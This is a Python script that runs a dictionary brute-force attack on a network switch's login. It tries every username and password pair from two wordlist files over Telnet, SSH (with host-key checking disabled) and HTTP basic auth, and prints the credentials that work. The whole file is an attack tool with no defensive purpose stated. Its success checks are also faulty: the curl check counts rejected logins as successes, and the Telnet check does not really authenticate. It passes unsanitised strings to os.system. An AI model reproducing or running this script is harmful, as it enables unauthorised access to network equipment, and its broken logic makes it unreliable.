import os
import time

# Define the IP address of the switch
switch_ip_address = '192.168.1.2'

# Define the lists of username and password
username_list_file = 'usernames.txt'
password_list_file = 'passwords.txt'

# Read the list of usernames from the file
with open(username_list_file, 'r') as f:
    usernames = [line.strip() for line in f.readlines()]

# Read the list of passwords from the file
with open(password_list_file, 'r') as f:
    passwords = [line.strip() for line in f.readlines()]

# Function to attempt Telnet access
def try_telnet(username, password):
    command = f"telnet {switch_ip_address}"
    output = os.system(f"echo {username}\n{password} | {command}")
    if output == 0:
        print(f"Telnet access successful with username '{username}' and password '{password}'")
        return True
    else:
        return False

# Function to attempt SSH access
def try_ssh(username, password):
    command = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{switch_ip_address} 'exit'"
    output = os.system(command)
    if output == 0:
        print(f"SSH access successful with username '{username}' and password '{password}'")
        return True
    else:
        return False

# Function to attempt HTTP access
def try_http(username, password):
    command = f"curl -u {username}:{password} http://{switch_ip_address}"
    output = os.system(command)
    if output == 0:
        print(f"HTTP access successful with username '{username}' and password '{password}'")
        return True
    else:
        return False

# Cracking attempt
for username in usernames:
    for password in passwords:
        print(f"Attempting access with username '{username}' and password '{password}'")
        if try_telnet(username, password) or try_ssh(username, password) or try_http(username, password):
            print(f"Access successful with username '{username}' and password '{password}'")
            # If access is successful, break the loop
            break
        else:
            print(f"Access failed with username '{username}' and password '{password}'")
        time.sleep(1)  # Wait 1 second before trying again
